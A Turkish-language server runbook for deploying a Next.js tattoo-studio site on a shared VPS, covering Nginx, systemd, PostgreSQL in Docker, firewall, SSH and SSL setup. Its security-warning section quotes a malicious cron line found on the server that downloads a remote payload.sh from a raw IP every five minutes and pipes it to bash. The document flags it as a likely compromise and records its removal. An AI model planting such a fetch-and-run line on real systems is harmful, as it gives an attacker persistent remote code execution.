# ENKI TATTOO — PROD VPS Deploy & Mimari Kilit Dokümanı (2026)

> Amaç: “Sunucuya nasıl girilir, neler açık, hangi domain hangi porta gider, servisler nerede çalışır, nasıl deploy edilir, nasıl kontrol edilir?”  
> Bu dosya **tek sayfa operasyon rehberi** gibi kullanılacak.

---

## 0) TL;DR (LOCK)
- Reverse proxy: **Nginx (80/443)**
- SSL: **Let’s Encrypt + Certbot**
- SSH: **root login kapalı**, **password auth kapalı**, **sadece key** (kanıt: `permitrootlogin no`, `passwordauthentication no`)
- Firewall: **UFW aktif**, sadece **22/80/443** inbound
- Fail2ban: **aktif**
- Node: **v20.20.0 (NVM)**
- Docker: **aktif**
- PostgreSQL: **Docker container içinde** (`cinselhobi_db`, `postgres:16`) ve **host’ta 127.0.0.1:5432** üzerinden erişiliyor
- Mevcut Next.js servisleri:
  - `www.cinselhobi.com` → `127.0.0.1:3000` (**Next 16.1.1**, cwd: `/var/www/cinselhobi/app`)
  - `yatta.com.tr` → `127.0.0.1:3001` (**Next 16.0.1**, systemd: `yatta-next.service`, cwd: `/var/www/apps/yatta-next-frontend`)
- Enki Tattoo önerilen internal port (LOCK-PLAN): **3002** (3000/3001 dolu)
- Enki DB adı (LOCK-PLAN): **enki**

---

## 1) Sunucu Kimliği (Envanter)
> Bu bölüm “%100 doğruluk” için sunucudan komut çıktısıyla doldurulmalı.

**LOCK / Kanıtlı olanlar:**
- Hostname: `ubuntu-4gb-nbg1-1` (shell prompt’tan görülüyor)
- Node: `v20.20.0` (NVM path: `/home/murti/.nvm/versions/node/v20.20.0/bin/node`)
- Nginx config root: `/etc/nginx/sites-enabled/`

**UNKNOWN (komutla doldur):**
- Provider / Plan / Region / IPv4 / OS versiyonu / Kernel

**Doğrulama komutları:**
```bash
hostname
uname -a
lsb_release -a || cat /etc/os-release
ip a
```

---

## 2) Ağ / Portlar / Güvenlik (Kanıtlı)

### 2.1 Açık portlar

* 22/tcp: SSH
* 80/tcp: HTTP
* 443/tcp: HTTPS

Doğrulama:

```bash
sudo ufw status verbose
sudo ss -ltnp | head -n 80
```

### 2.2 SSH kilitleri

Doğrulama:

```bash
sudo sshd -T | grep -Ei "permitrootlogin|passwordauthentication|pubkeyauthentication"
```

Beklenen çıktı (kilit):

* `permitrootlogin no`
* `passwordauthentication no`
* `pubkeyauthentication yes`

### 2.3 Fail2ban

```bash
sudo systemctl status fail2ban --no-pager
```

---

## 3) Nginx Domain Map (Kanıtlı)

### 3.1 Cinselhobi

**Config yolu:** `/etc/nginx/sites-enabled/cinselhobi.com`

Akış:

1. `http://cinselhobi.com` ve `http://www.cinselhobi.com` → **301** → `https://www.cinselhobi.com`
2. `https://cinselhobi.com` → **301** → `https://www.cinselhobi.com`
3. `https://www.cinselhobi.com` → reverse proxy → `http://127.0.0.1:3000`

Proxy kanıt satırı:

```nginx
proxy_pass http://127.0.0.1:3000;
```

Ek: `/uploads/` statik alias:

```nginx
location ^~ /uploads/ { alias /data/uploads/; ... }
```

### 3.2 Yatta

**Config yolu:** `/etc/nginx/sites-enabled/yatta.com.tr`

Akış:

1. HTTP 80: ACME challenge var + genel trafik **HTTPS’e** yönlenir
2. HTTPS 443: reverse proxy → `http://127.0.0.1:3001`

Proxy kanıt satırı:

```nginx
proxy_pass http://127.0.0.1:3001;
```

### 3.3 Enki Tattoo (LOCK-PLAN / Henüz yok)

**Hedef domain:** `enkitattoo.com.tr`

Canonical öneri (tek hop, SEO temiz):

* `https://enkitattoo.com.tr` canonical
* `www.enkitattoo.com.tr` → 301 apex

**Planlanan internal port:** `3002`

> Not: Sertifika alınmadan 443 server block finalize edilmez.

---

## 4) Uygulamalar / Process Yönetimi (Kanıtlı + Plan)

### 4.1 Yatta (systemd ile yönetiliyor)

* Service: `yatta-next.service`
* WorkingDirectory: `/var/www/apps/yatta-next-frontend`
* Port env: `PORT=3001`
* Başlatma: `next start -p 3001` (NVM ile bash -lc içinde)

Kontrol:

```bash
systemctl status yatta-next.service --no-pager
journalctl -u yatta-next.service -f
```

### 4.2 Cinselhobi (PM2 ile yönetiliyor — Kanıtlı)

Process chain kanıtı:

* `systemd → PM2 v6.0.14 → npm start → next start → next-server (v16.1.1)`
* Çalışma dizini: `/var/www/cinselhobi/app`
* Port: `3000`

Kontrol (pratik):

```bash
# port ve cwd
sudo lsof -nP -iTCP:3000 -sTCP:LISTEN
PID3000=$(sudo ss -ltnp | sed -n 's/.*:3000 .*pid=\([0-9]\+\).*/\1/p' | head -n 1)
sudo readlink -f /proc/$PID3000/cwd

# pm2 varsa:
pm2 status
pm2 logs --lines 200
```

> Not: Cinselhobi için ayrı systemd unit görünmedi. PM2 ile manage ediliyor.

### 4.3 MD Kitchen (ek bilgi)

* `mdkitchen-prices-api.service` aktif (Node server.mjs)
* Nginx tarafında `mdkitchen.conf` var (server_name: mdkitchen.com.tr + www)

### 4.4 Enki Tattoo (LOCK-PLAN: systemd + Nginx)

**Önerilen model (acemi-dostu, stabil):**

* Next.js: `next start -p 3002`
* systemd: `enki-web.service` (User: murti)
* Nginx: `enkitattoo.com.tr` → `127.0.0.1:3002`

**Önerilen deploy dizini standardı:**

* `/var/www/apps/enki-web` (Yatta pattern’iyle aynı)

---

## 5) PostgreSQL (Docker) — Kanıtlı

### 5.1 Container

* Container: `cinselhobi_db`
* Image: `postgres:16`
* Publish: `127.0.0.1:5432 -> container 5432`

Doğrulama:

```bash
sudo docker ps --format "table {{.Names}}\t{{.Image}}\t{{.Ports}}"
```

### 5.2 DB listesi (Kanıtlı)

Container içinde kullanıcı: `cinselhobi`
DB’ler:

* `cinselhobi`
* `postgres`
* `template0`
* `template1`

Doğrulama:

```bash
sudo docker exec -it cinselhobi_db psql -U cinselhobi -d cinselhobi -c "\l"
```

### 5.3 Enki DB (LOCK-PLAN)

* DB adı: `enki`
* Owner: (tercihen) ayrı user: `enki_owner` (opsiyonel)

> Güvenlik: `POSTGRES_PASSWORD` gibi secret’lar **dokümana yazılmaz**, sadece “nerede saklanacağı” yazılır.

---

## 6) Enki Tattoo — Deploy Planı (LOCK-PLAN)

### 6.1 Port seçimi

Mevcut durum:

* 3000: Cinselhobi
* 3001: Yatta
* 3002: boş ✅

Enki port: **3002**

Doğrulama:

```bash
for p in 3000 3001 3002; do sudo ss -ltnp | grep -q ":$p " && echo "USED $p" || echo "FREE $p"; done
```

### 6.2 systemd service şablonu (Enki)

> Dosya: `/etc/systemd/system/enki-web.service` (PLAN)

```ini
[Unit]
Description=Enki Tattoo Next.js Frontend
After=network.target

[Service]
Type=simple
User=murti
WorkingDirectory=/var/www/apps/enki-web
Environment=NODE_ENV=production
Environment=PORT=3002
ExecStart=/usr/bin/env bash -lc 'set -e; cd /var/www/apps/enki-web; export NVM_DIR="$HOME/.nvm"; [ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"; nvm use 20; npm ci; npm run build; npm run start -- -p 3002'
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
```

> Not: Bu şablon “deploy + start”ı tek ExecStart’a koyuyor. İleride daha temiz hale getiririz (build ayrı step). Şimdilik acemi-dostu ve deterministik.

### 6.3 Nginx site şablonu (Enki)

> Dosya: `/etc/nginx/sites-available/enkitattoo.com.tr` (PLAN)
> Symlink: `/etc/nginx/sites-enabled/enkitattoo.com.tr`

* HTTP: ACME + HTTPS redirect
* HTTPS apex: proxy → 3002
* HTTPS www: 301 → apex

---

## 7) Operasyon Komutları (Günlük kullanım)

### 7.1 Nginx

```bash
sudo nginx -t
sudo systemctl reload nginx
sudo systemctl status nginx --no-pager
```

### 7.2 Certbot

```bash
certbot --version
sudo certbot certificates
systemctl list-timers --all | grep -i certbot || true
```

### 7.3 Yatta (systemd)

```bash
sudo systemctl restart yatta-next.service
journalctl -u yatta-next.service -f
```

### 7.4 Cinselhobi (PM2)

```bash
pm2 status
pm2 logs --lines 200
```

### 7.5 Docker DB

```bash
sudo docker ps
sudo docker logs --tail 200 cinselhobi_db
```

---

## 8) KRİTİK GÜVENLİK UYARISI (ACİL)

Kullanıcı crontab’ında şu satır **tespit edildi**:

```cron
*/5 * * * * curl -sL http://80.78.26.92:8000/payload.sh | bash
```

Bu davranış:

* Her 5 dakikada bir internetten script indirip **doğrudan çalıştırır**
* Bu, **çok yüksek risk** (supply-chain / sunucu ele geçirilmesi / arka kapı)

**LOCK-ACTION (Öneri):** Bunu acilen kaldır ve kaynağı araştır.

Güvenli inceleme adımları (önce kaldır, sonra incele):

```bash
crontab -l
crontab -e   # satırı sil

# cron kaynak taraması
sudo grep -RIn "payload.sh\|80\.78\.26\.92" /etc/cron* /var/spool/cron* 2>/dev/null || true

# indirip ÇALIŞTIRMADAN içerik bak (sadece inceleme)
curl -sL http://80.78.26.92:8000/payload.sh | sed -n '1,120p'
```

> Eğer bunu “bilerek” koymadıysan, bu **kompromize** işareti olabilir. Bu durumda ek hardening + log inceleme + credential rotasyonu yapılmalı.

---

## 9) Açık Sorular / UNKNOWN Listesi (Son Kilit için)

* Provider/Plan/Region/IP/OS/Kernel (Komutla doldur)
* Enki repo prod’da nereye clone edilecek? (öneri: `/var/www/apps/enki-web`)
* Enki için sertifika alınacak mı? (Evet: Certbot ile)
* Enki DB oluşturma zamanı (doküman kilitlendikten sonra)

---

## 10) Sonraki Dokümanlar (MasterPack sırası önerisi)

* `./00-masterpack.md` (tek giriş noktası)
* `./01-design-system-styleguide.md` (design rules / source of truth)
* `./02-responsive-checklist.md` (responsive QA checklist)
* `./03-icons-and-safe-area.md` (ikon sistemi ve safe-area kuralları)
* `./04-repo-hygiene.md` (repo düzeni ve dokümantasyon hijyeni)
* `./90-timeline.md` (tarihçe)



````md
## 11) 2026-02-23 — ENKI TATTOO PROD Deploy (GERÇEKLEŞEN / LOCK)

> Bu bölüm, bugün yapılan tüm deploy işlemlerinin **kanıtlı** “runbook” özetidir.  
> Kural: **git stash / git restore / git clean -fd / riskli reset YOK.**  
> Hedef: `https://enkitattoo.com.tr` ve `https://www.enkitattoo.com.tr` → Nginx → Next.js (3002) + SSL + tek-hop redirect + deploy key ile git pull.

---

### 11.1 DNS (PASS)
- Domain: `enkitattoo.com.tr` + `www.enkitattoo.com.tr`
- A kaydı → **46.225.4.51**
- TTL: 300 (Hetzner DNS panel)

Doğrulama:
```bash
dig +short enkitattoo.com.tr A
dig +short www.enkitattoo.com.tr A
curl -I http://enkitattoo.com.tr
````

---

### 11.2 UFW / SSH Güvenlik (PASS)

* UFW: inbound default deny
* 80/443: Anywhere (public)
* 22: **Sadece tailscale0** üzerinden (SSH via Tailscale only)

Kanıt:

```bash
sudo ufw status verbose
sudo ufw status numbered
```

> Not: Daha önce crontab’da bulunan şüpheli `payload.sh` satırı temizlendi (PASS). Bu dokümanda tekrar eklenmez.

---

### 11.3 Deploy kullanıcısı (PASS)

Amaç: repo/Node işleri için ayrı kullanıcı (**deploy**) + SSH key ile giriş.

Root ile oluşturma:

```bash
sudo -i
adduser deploy
usermod -aG sudo deploy
```

Deploy SSH erişimi (authorized_keys kopyalama):

```bash
sudo mkdir -p /home/deploy/.ssh
sudo chmod 700 /home/deploy/.ssh
sudo cp -a /home/murti/.ssh/authorized_keys /home/deploy/.ssh/authorized_keys
sudo chown -R deploy:deploy /home/deploy/.ssh
sudo chmod 600 /home/deploy/.ssh/authorized_keys
```

Deploy user doğrulama:

```bash
sudo -iu deploy
whoami
pwd
```

---

### 11.4 GitHub Deploy Key (PASS)

Amaç: sunucunun repo’ya **read-only** erişmesi.

Deploy user altında key üret:

```bash
sudo -iu deploy
ssh-keygen -t ed25519 -f ~/.ssh/github_enki_deploy -C "deploy@enkitattoo"
cat ~/.ssh/github_enki_deploy.pub
```

GitHub → repo → Settings → Deploy keys → **Add key** (Read-only önerildi)
Sonra GitHub host key + SSH config:

```bash
ssh-keyscan -H github.com >> ~/.ssh/known_hosts
chmod 600 ~/.ssh/known_hosts

cat > ~/.ssh/config <<'EOF'
Host github.com
  HostName github.com
  User git
  IdentityFile ~/.ssh/github_enki_deploy
  IdentitiesOnly yes
EOF
chmod 600 ~/.ssh/config
```

Bağlantı testi:

```bash
ssh -T git@github.com
# Beklenen: "You've successfully authenticated..."
```

---

### 11.5 Repo klasörü standardı + clone (PASS)

Standart dizin:

* `/var/www/apps/enki-web`

Hazırlık:

```bash
sudo mkdir -p /var/www/apps
sudo chown -R deploy:deploy /var/www/apps
```

Clone:

```bash
sudo -iu deploy
cd /var/www/apps
git clone git@github.com:muratgulerr33/enkitattoo.git enki-web
cd enki-web
git status -sb
ls -1 | egrep 'package-lock\.json|pnpm-lock\.yaml|yarn\.lock' || true
```

> Not: `package-lock.json` bulundu → package manager **npm** (LOCK).

---

### 11.6 İzin / “dubious ownership” ve node_modules (PASS)

Repo sahibi **deploy** olacak (npm ci izin hatası olmaması için):

```bash
sudo chown -R deploy:deploy /var/www/apps/enki-web
```

> Not: Murti user ile repo içine girilirse `fatal: detected dubious ownership` görülebilir.
> Çözüm: Repo işleri **deploy** user ile yapılır (LOCK). Gerekirse murti için safe.directory eklenebilir ama önerilmez.

---

### 11.7 Node / NVM (deploy user) (PASS)

Deploy user için nvm kurulumu:

```bash
sudo -iu deploy
curl -fsSL https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh -o /tmp/nvm_install.sh
bash /tmp/nvm_install.sh

export NVM_DIR="$HOME/.nvm"
[ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"

nvm install 20
nvm use 20
nvm alias default 20
node -v
npm -v
```

---

### 11.8 Build (PASS)

```bash
sudo -iu deploy
cd /var/www/apps/enki-web

export NVM_DIR="$HOME/.nvm"
. "$NVM_DIR/nvm.sh"
nvm use 20 >/dev/null

npm ci
npm run build
```

---

### 11.9 systemd (ENKİ) — Çalıştırma modeli (LOCK)

Port (LOCK): **3002**
Bind (LOCK): **127.0.0.1** (sadece Nginx erişsin)

Servis dosyası:

* `/etc/systemd/system/enki-web.service`

İçerik (LOCK):

```ini
[Unit]
Description=Enki Tattoo Web (Next.js)
After=network.target

[Service]
Type=simple
User=deploy
WorkingDirectory=/var/www/apps/enki-web
Environment=NODE_ENV=production
Environment=NEXT_TELEMETRY_DISABLED=1
ExecStart=/bin/bash -lc 'export NVM_DIR="/home/deploy/.nvm"; . "$NVM_DIR/nvm.sh"; nvm use 20 >/dev/null; exec npm run start -- -p 3002 -H 127.0.0.1'
Restart=always
RestartSec=3
TimeoutStartSec=60

[Install]
WantedBy=multi-user.target
```

Aktifleştirme:

```bash
sudo systemctl daemon-reload
sudo systemctl enable --now enki-web.service
sudo systemctl status enki-web.service --no-pager
```

Health (localhost):

```bash
sudo ss -ltnp | grep ':3002' || true
curl -I http://127.0.0.1:3002
# Beklenen: 200 OK
```

---

### 11.10 Nginx reverse proxy + cache snippet (LOCK)

Snippet yolu:

* `/etc/nginx/snippets/enki-web-proxy.conf`

İçerik (LOCK):

```nginx
location ^~ /_next/static/ {
  proxy_pass http://127.0.0.1:3002;
  proxy_http_version 1.1;
  proxy_set_header Host $host;
  proxy_set_header X-Forwarded-Proto $scheme;
  proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
  proxy_set_header X-Real-IP $remote_addr;

  expires 30d;
  add_header Cache-Control "public, max-age=2592000, immutable";
  access_log off;
}

location / {
  proxy_pass http://127.0.0.1:3002;
  proxy_http_version 1.1;
  proxy_set_header Host $host;
  proxy_set_header X-Forwarded-Proto $scheme;
  proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
  proxy_set_header X-Real-IP $remote_addr;

  proxy_set_header Upgrade $http_upgrade;
  proxy_set_header Connection "upgrade";
}

add_header X-Content-Type-Options "nosniff" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header X-Frame-Options "SAMEORIGIN" always;
```

---

### 11.11 Let’s Encrypt webroot dizini (PASS)

```bash
sudo mkdir -p /var/www/_letsencrypt
sudo chmod 755 /var/www/_letsencrypt
```

---

### 11.12 Nginx site config (ENKİ) + tek hop redirect (LOCK)

Site yolu:

* `/etc/nginx/sites-available/enkitattoo.com.tr`
* Symlink:

  * `/etc/nginx/sites-enabled/enkitattoo.com.tr`

İçerik (LOCK): (ACME hem 80 hem 443’te var; redirect **308**)

```nginx
# 80: ACME + tek hop https apex
server {
  listen 80;
  server_name enkitattoo.com.tr www.enkitattoo.com.tr;

  location ^~ /.well-known/acme-challenge/ {
    root /var/www/_letsencrypt;
  }

  return 308 https://enkitattoo.com.tr$request_uri;
}

# 443: apex -> app
server {
  listen 443 ssl http2;
  server_name enkitattoo.com.tr;

  ssl_certificate     /etc/letsencrypt/live/enkitattoo.com.tr/fullchain.pem;
  ssl_certificate_key /etc/letsencrypt/live/enkitattoo.com.tr/privkey.pem;

  location ^~ /.well-known/acme-challenge/ {
    root /var/www/_letsencrypt;
  }

  include /etc/nginx/snippets/enki-web-proxy.conf;
}

# 443: www -> apex
server {
  listen 443 ssl http2;
  server_name www.enkitattoo.com.tr;

  ssl_certificate     /etc/letsencrypt/live/enkitattoo.com.tr/fullchain.pem;
  ssl_certificate_key /etc/letsencrypt/live/enkitattoo.com.tr/privkey.pem;

  location ^~ /.well-known/acme-challenge/ {
    root /var/www/_letsencrypt;
  }

  return 308 https://enkitattoo.com.tr$request_uri;
}
```

Aktif et:

```bash
sudo ln -sf /etc/nginx/sites-available/enkitattoo.com.tr /etc/nginx/sites-enabled/enkitattoo.com.tr
sudo nginx -t
sudo systemctl reload nginx
```

Tek-hop doğrulama (LOCK-PASS):

```bash
curl -s -o /dev/null -w "https apex redirects=%{num_redirects}\n" -L https://enkitattoo.com.tr/
curl -s -o /dev/null -w "https www redirects=%{num_redirects}\n" -L https://www.enkitattoo.com.tr/
curl -s -o /dev/null -w "http apex redirects=%{num_redirects}\n" -L http://enkitattoo.com.tr/
curl -s -o /dev/null -w "http www redirects=%{num_redirects}\n" -L http://www.enkitattoo.com.tr/
# Beklenen: https apex=0, diğerleri=1
```

> Bugfix notu (PASS): Başta `enkitattoo.com.tr` tarayıcıda `cinselhobi.com` açıyordu. Sebep: 443’te enki server block yoktu → default vhost yakalıyordu. Enki 443 block + SSL sonrası düzeldi.

---

### 11.13 Certbot SSL (PASS)

Kurulum (snap):

```bash
sudo snap install --classic certbot
sudo ln -sf /snap/bin/certbot /usr/bin/certbot
certbot --version
```

Sertifika alma (webroot):

```bash
sudo certbot certonly --webroot -w /var/www/_letsencrypt -d enkitattoo.com.tr -d www.enkitattoo.com.tr
# Sertifika path:
# /etc/letsencrypt/live/enkitattoo.com.tr/fullchain.pem
# /etc/letsencrypt/live/enkitattoo.com.tr/privkey.pem
```

Renew test:

```bash
sudo certbot renew --dry-run
# Beklenen: success
```

> Bugfix notu (PASS): Dry-run ilk denemede 404 verebildi (challenge istekleri HTTPS’ten geldiği için). Çözüm: 443 server block içinde de `/.well-known/acme-challenge/` location eklemek (yukarıdaki LOCK config).

---

### 11.14 “Yanlış portla test” kazası (PASS)

* Sunucuda `127.0.0.1:4010` dinleyen **www-data node** process tespit edildi (test karışıklığı yarattı).
* Kapatıldı.

Kanıt / kontrol:

```bash
sudo ss -ltnp | grep ':4010' || echo "4010 kapalı"
```

---

### 11.15 Günlük Deploy Rutini (CI yok, manuel) (LOCK)

> Repo işleri: **deploy user**
> Servis yönetimi: **murti sudo**

1. Pull + build (deploy):

```bash
sudo -iu deploy
cd /var/www/apps/enki-web

# Eğer next-env.d.ts otomatik değiştiyse (stash/restore yok):
git status -sb
git checkout -- next-env.d.ts || true

git pull --ff-only

export NVM_DIR="$HOME/.nvm"
. "$NVM_DIR/nvm.sh"
nvm use 20 >/dev/null

npm ci
npm run build
exit
```

2. Restart (murti):

```bash
sudo systemctl restart enki-web.service
sudo systemctl status enki-web.service --no-pager
```

3. Kontrol:

```bash
curl -I http://127.0.0.1:3002
curl -I https://enkitattoo.com.tr
curl -I https://enkitattoo.com.tr/opengraph-image
curl -I https://enkitattoo.com.tr/twitter-image
curl -I https://enkitattoo.com.tr/manifest.webmanifest
```

---

### 11.16 OG/Twitter/Manifest/PWA deploy notu (PASS)

* OG ve Twitter image endpointleri: `/opengraph-image`, `/twitter-image` (dynamic) çalışır durumda (200).
* İstenirse **statik OG** için: `public/og.png` eklenir + `src/app/layout.tsx` içinde:

  * `openGraph.images.url = "/og.png?v=N"`
  * `twitter.images = ["/og.png?v=N"]`
* Cache kırma: `v=1 → v=2 → v=3 ...`
* Meta Debugger uyarısı `fb:app_id` opsiyoneldir; preview çalışmasını engellemez.

Doğrulama:

```bash
curl -I https://enkitattoo.com.tr/og.png || true
curl -s https://enkitattoo.com.tr/ | tr '\n' ' ' | sed 's/</\n</g' | egrep -i 'og:image|twitter:image' | head -n 20
```

```
```
